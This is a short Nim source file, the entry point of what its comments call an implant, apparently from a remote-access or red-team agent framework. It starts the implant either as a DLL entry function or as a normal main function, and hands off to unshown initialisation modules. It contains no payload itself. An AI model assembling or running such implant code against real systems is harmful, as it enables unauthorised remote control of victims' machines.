import custom
import routine/start

when defined(dllsafe):
  proc implantStart(lp: pointer): culong {.stdcall.} =
    # Entrypoint of the implant for a dll build
    custom.preface()
    start.main_init()
    return 0
  discard implantStart(nil)
else:
  proc main(): void =
    # Main function that starts the implant
    custom.preface()
    start.main_init()
  main()
